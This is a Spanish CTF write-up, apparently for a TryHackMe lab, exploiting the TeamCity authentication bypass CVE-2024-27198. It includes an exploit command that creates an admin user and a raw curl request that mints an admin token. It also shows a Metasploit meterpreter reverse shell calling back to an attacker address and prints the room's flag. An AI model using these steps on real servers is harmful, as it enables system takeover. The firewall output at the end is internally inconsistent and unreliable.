# 1. ANÁLISIS INICIAL DE PUERTOS Y SERVICIOS

## 1.1 Escaneo Nmap y servicios detectados

```bash
Host is up (0.045s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 84:42:cb:06:38:2f:36:a9:81:14:76:c3:4f:d1:ee:a4 (RSA)
|   256 1c:60:31:78:ab:be:da:73:7f:d7:09:28:77:d2:55:0d (ECDSA)
|_  256 3b:df:08:93:f3:93:61:1d:22:72:e7:1c:4b:49:54:4c (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
37725/tcp open  java-rmi Java RMI
50000/tcp open  http     Apache Tomcat (language: en)
| http-title: Log in to TeamCity &mdash; TeamCity
|_Requested resource was /login.html
|_http-favicon: Unknown favicon MD5: CEE18E28257988B40028043E65A6C2A3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/22%OT=22%CT=1%CU=37858%PV=Y%DS=3%DC=I%G=Y%TM=6A38E65
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=109%GCD=1%ISR=10B%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST
OS:11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4
OS:E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%
OS:T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

Una vez hecho el escaneo, encontramos el puerto 50000, en donde se aloja una versión vulnerable de JetBrains TeamCity (Version 2023.11.3 (build 147512)).

## 1.2 Identificación de la versión vulnerable de TeamCity

![](Evidencias_Visuales/vulnerableversion)

---

# 2. EXPLOTACIÓN DE LA VULNERABILIDAD CVE-2024-27198

## 2.1 Investigación OSINT de la vulnerabilidad crítica

Mediante investigación OSINT encontramos una vulnerabilidad crítica (CVE-2024-27198) que podemos entender a detalle en el siguiente enlace hxxps[://]rapid7[.]com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/?ref=blog.gitguardian.com (todos los links se encuentran desactivados, si se desea ingresar a las páginas se deben quitar los corchetes y cambiar el formato de hxxps[://] a  https://)

## 2.2 Creación de usuario administrador mediante exploit

Esta vulnerabilidad crítica con un base score de 9.8, permite ejecutar código malicioso con el cual podemos crear un nuevo usaurio y contraseña, los cuales serán almacenados y nos permitira acceso completo a la página web, el código lo podemos encontrar en la siguiente dirección: hxxps[://]github[.]com/yoryio/CVE-2024-27198/blob/main/CVE-2024-27198.py

Una vez ejecutado el comando `python CVE-2024-27198.py -t http://10.128.148.36:50000/ -u AGARTI -p root` hemos creado un nuevo usuario con permisos de administrador (AGARTI) con una nueva contraseña (root). Lo que nos permite acceder a la página web.

```bash
[+] Version Found:  2023.11.3 (build 147512)
[+] Server vulnerable, returning HTTP 200
[+] New user AGARTI created succesfully! Go to http://10.128.148.36:50000//login.html to login with your new credentials :)
```

![](Evidencias_Visuales/newcredentials)

![](Evidencias_Visuales/newuser)

## 2.3 Inyección alternativa de token de acceso

Otra forma de lograr acceso es mediante la inyección de un token de acceso al usuario admin mediante el comando: 

```bash
┌──(kali㉿kali)-[~]
└─$ curl -ik 'http://10.128.148.36:50000/hax?jsp=/app/rest/users/id:1/tokens/AgartiToken;.jsp' -X POST
HTTP/1.1 200 
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store
Content-Type: application/xml;charset=ISO-8859-1
Content-Language: en
Content-Length: 237
Date: Mon, 22 Jun 2026 11:11:28 GMT

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="AgartiToken" creationTime="2026-06-22T11:11:27.989Z" value="eyJ0eXAiOiAiVENWMiJ9.Uy1sYXM0U0J5T3REb2FNWFlmODJ4WTBJaW53.NjlkZTZiYzUtNmM3Ni00NzM2LTg4ODQtYTg2NmFhODZkNjIx"/> 
```

![](Evidencias_Visuales/accesstoken)

---

# 3. ACCESO Y CONFIGURACIÓN DEL SISTEMA

## 3.1 Acceso a la interfaz web de TeamCity

Una vez dentro del sistema, y con un usuario con permisos de adminsitrador, podemos, dentro de TeamCity, crear un nuevo proyecto con el cual podremos ejecutar líneas de comandos.

![](Evidencias_Visuales/buildsteps)

## 3.2 Configuración del agente de compilación

Antes de ejecutar el proyecto, debemos asegurarnos de tener un agente activado ya que en TeamCity, un agente de compilación (build agent) es un programa de software independiente que escucha las órdenes del servidor central de TeamCity y ejecuta las tareas reales de compilación, pruebas y despliegue (CI/CD)

![](Evidencias_Visuales/pool)

Para ello debemos instalar el agente en nuestro equipo para que reciba los comandos y sirva como comunicación activa con el servidor de TeamCity en donde constantemente preguntará si hay algún trabajo (build) en la cola esperando ser ejecutado.

![](Evidencias_Visuales/agent)

## 3.3 Creación y ejecución de comandos en el proyecto

Una vez instalado el agente, podemos ejecutar la línea de comandos mediante el comando Run

![](Evidencias_Visuales/runbassic)

---

# 4. MÉTODO ALTERNATIVO: EXPLOTACIÓN CON METASPLOIT 

## 4.1 Configuración del módulo de explotación

```bash
search cve:2024-27198
msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set rport 50000
rport => 50000
msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set rhost 10.128.148.36
rhost => 10.128.148.36
msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set lhost 192.168.128.160
lhost => 192.168.128.160
msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:po
                                                 rt][...]. Supported proxies: socks5, socks5h, sapni,
                                                  http, socks4
   RHOSTS             10.128.148.36    yes       The target host(s), see https://docs.metasploit.com/
                                                 docs/using-metasploit/basics/using-metasploit.html
   RPORT              50000            yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate a
                                                 s
   VHOST                               no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.128.160  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java
```

## 4.2 Obtención de shell inversa con Meterpreter

```bash
msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit
[*] Started reverse TCP handler on 192.168.128.160:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.RTJEcmlaRHpwOGJPSW5wVXpzRjB1RWVaQjVV.MmM5NmUyOTAtMzY0OS00MTNmLWE2NGEtNzdiNjU4NzZhOGI0
[*] Uploading plugin: nFkmodSC
[*] Sending stage (58073 bytes) to 10.128.148.36
[*] Deleting the plugin...
[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_nFkmodSC
[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/nFkmodSC
[*] Meterpreter session 1 opened (192.168.128.160:4444 -> 10.128.148.36:53446) at 2026-06-22 12:21:19 +0200
[*] Deleting the authentication token...
[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/nFkmodSC' on the target

meterpreter > shell
Process 1 created.
Channel 1 created.
```

## 4.3 Acceso al sistema y recuperación de la flag

```bash
cd /home/ubuntu
ls -la
total 60
drwxr-xr-x 7 ubuntu ubuntu 4096 Aug  2  2024 .
drwxr-xr-x 3 root   root   4096 Jul  2  2024 ..
drwxr-x--- 6 ubuntu ubuntu 4096 Jun 22 07:25 .BuildServer
lrwxrwxrwx 1 root   root      9 Jul  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Jul  2  2024 .cache
drwx------ 3 ubuntu ubuntu 4096 Aug  2  2024 .config
drwxrwxr-x 3 ubuntu ubuntu 4096 Jul  2  2024 .local
-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
-rw-rw-r-- 1 ubuntu ubuntu   66 Jul  2  2024 .selected_editor
drwx------ 2 ubuntu ubuntu 4096 Jul  2  2024 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Jul  2  2024 .sudo_as_admin_successful
-rw-rw-r-- 1 ubuntu ubuntu  214 Jul  2  2024 .wget-hsts
-rw-rw-r-- 1 ubuntu ubuntu 4829 Jul  2  2024 config.log
-rw-rw-r-- 1 ubuntu ubuntu   38 Jul  2  2024 flag.txt
cat flag.txt
THM{faa9bac345709b6620a6200b484c7594}
```
## 4.4 Estado del firewall del sistema

```bash
meterpreter > shell
Process 1 created.
Channel 1 created.
sudo ufw status
Status: inactive
ufw --version
/bin/sh: 2: ufw: not found
systemctl status ufw
● ufw.service - Uncomplicated firewall
     Loaded: loaded (/lib/systemd/system/ufw.service; enabled; vendor preset: enabled)
     Active: active (exited) since Thu 2026-06-25 14:55:48 UTC; 8min ago
       Docs: man:ufw(8)
   Main PID: 186 (code=exited, status=0/SUCCESS)
      Tasks: 0 (limit: 4671)
     Memory: 0B
     CGroup: /system.slice/ufw.service
```
